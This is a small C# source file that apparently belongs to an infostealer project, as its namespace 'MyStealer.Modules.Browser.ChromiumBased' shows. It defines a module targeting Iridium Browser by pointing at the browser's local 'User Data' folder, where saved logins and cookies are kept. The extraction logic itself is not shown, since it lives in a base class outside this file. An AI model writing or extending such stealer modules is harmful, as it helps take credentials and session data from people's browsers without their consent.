using System.IO;
using System;

namespace MyStealer.Modules.Browser.ChromiumBased
{
    internal class IridiumBrowser : Chromium
    {
        public override string ApplicationName => "Iridium Browser";

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Iridium", "User Data");
    }
}
